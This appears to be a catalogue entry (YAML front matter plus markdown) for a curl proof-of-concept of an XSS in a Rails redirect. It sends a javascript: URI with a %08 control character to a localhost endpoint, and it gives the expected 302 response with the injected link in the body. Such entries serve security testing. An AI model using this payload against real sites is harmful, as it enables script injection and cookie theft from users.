---
id: cmd-rails-xss-001
data: >-
  curl -v
  "http://localhost:3000/vuln?redirect_url=javascript:alert(document.cookie)%08"
tags:
  - xss
  - poc
  - curl
type: command
output: >-
  HTTP/1.1 302 Found\n<no Location header>\nbody: <html><body>You are being <a
  href=\"javascript:alert(document.cookie) \">redirected</a>.</body></html>
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:37.994Z'
verified: false
validated: true
submitted: true
---
# rails-redirect-xss-poc

## Command

```bash
curl -v "http://localhost:3000/vuln?redirect_url=javascript:alert(document.cookie)%08"
```

## Description

This command sends a proof-of-concept HTTP GET request to a vulnerable Rails endpoint, injecting a javascript: URI with a %08 control character to strip the Location header and embed the payload in fallback HTML, demonstrating the XSS vulnerability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Verbose output to show headers | Yes |
| `redirect_url` | Payload parameter: javascript:alert(document.cookie)%08 | Yes |
| URL | Target endpoint, e.g., http://localhost:3000/vuln | Yes |

## Examples

### Basic Usage

```bash
curl -v "http://localhost:3000/vuln?redirect_url=javascript:alert(document.cookie)%08"
```

### Advanced Usage

```bash
curl -v -o response.html "http://localhost:3000/vuln?redirect_url=javascript:alert('XSS')%08dummy" && cat response.html
```

> Saves response to file for inspection; %08 causes backspace to invalidate header.

## Expected Output

Verbose curl shows 302 without Location header, followed by HTML body with injected <a href="javascript:alert(document.cookie) ">redirected</a>. No actual redirect occurs.

## Related

- [[Related Procedure|procedures/Inject-JavaScript-URI-with-Control-Character]]
